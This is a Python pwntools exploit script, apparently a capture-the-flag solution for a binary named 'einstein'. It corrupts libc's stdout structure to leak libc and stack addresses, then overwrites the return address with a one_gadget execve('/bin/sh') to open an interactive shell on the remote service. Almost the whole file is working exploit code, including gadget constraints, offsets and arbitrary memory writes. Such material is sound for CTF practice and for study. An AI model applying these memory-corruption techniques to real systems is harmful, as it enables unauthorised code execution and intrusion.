#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './einstein_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = elf.libc
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'einstein-bd91179989a5c1ab.deploy.phreaks.fr', 443

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port, ssl=True)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
b *handle+203
#b *handle+254
#b *handle+280
b *handle+333
c
'''.format(**locals())


# =========================================================
#                         EXPLOITS
# =========================================================
#0x54f4c posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
#constraints:
#  address rsp+0x68 is writable
#  rsp & 0xf == 0
#  rax == NULL || {"sh", rax, rip+0x16b4aa, r12, ...} is a valid argv
#  rbx == NULL || (u16)[rbx] == NULL

#0x54f53 posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
#constraints:
#  address rsp+0x68 is writable
#  rsp & 0xf == 0
#  rcx == NULL || {rcx, rax, rip+0x16b4aa, r12, ...} is a valid argv
#  rbx == NULL || (u16)[rbx] == NULL

#0xeb60e execve("/bin/sh", rbp-0x50, r12)
#constraints:
#  address rbp-0x48 is writable
#  rbx == NULL || {"/bin/sh", rbx, NULL} is a valid argv
#  [r12] == NULL || r12 == NULL || r12 is a valid envp

#0xeb66b execve("/bin/sh", rbp-0x50, [rbp-0x78])
#constraints:
#  address rbp-0x50 is writable
#  rax == NULL || {"/bin/sh", rax, NULL} is a valid argv
#  [[rbp-0x78]] == NULL || [rbp-0x78] == NULL || [rbp-0x78] is a valid envp

def write(where, what):
    io.sendline(str(where).encode() + b" " + str(what).encode())
    sleep(0.2)

def exploit():
    global io
    io = initialize()

    #Malloc big size so it start libc address
    io.sendlineafter("How long is your story ?", str(0x21000).encode())

    #Overwriting Stdout + 0x28
#    gdb.attach(io, gdbscript=gdbscript)
#    offset = -0x399010 + (libc.sym["_IO_2_1_stdout_"] + 0x28) #GDB
    offset = -0x2f0010 + (libc.sym["_IO_2_1_stdout_"] + 0x28) #Normal
    io.sendlineafter("What's the distortion of time and space ?", str(offset).encode())
    io.sendafter("Well your story is quite long, time may be distored, but it is a priceless ressource, i'll give you a few words only, use them wisely.", b"\xff")
    io.recvline()
    io.recv(5) #Adjusting to stdout
    leak = io.recvuntil("Everything")

    #Dump
    for i in range(20):
        log.info("Leak %#d: %#x", i+1, u64(leak[i*8:(i+1)*8]))

    #Leaks
    libc_leak = u64(leak[10*8:11*8])
    stack_leak = u64(leak[19*8:20*8])
    ret = stack_leak - 0x120
    rbp = ret + 0x8
    libc.address = libc_leak - libc.sym["_IO_file_jumps"]
    log.info("Libc leak: %#x", libc_leak)
    log.info("Libc base: %#x", libc.address)
    log.info("Stack leak: %#x", stack_leak)
    log.info("Ret: %#x", ret)

    #One Gadgets
    write(ret, libc.address + 0xeb66b)
    write(rbp - 0x78, 0)
    io.interactive()
    
if __name__ == '__main__':
#    while(1):
    exploit()
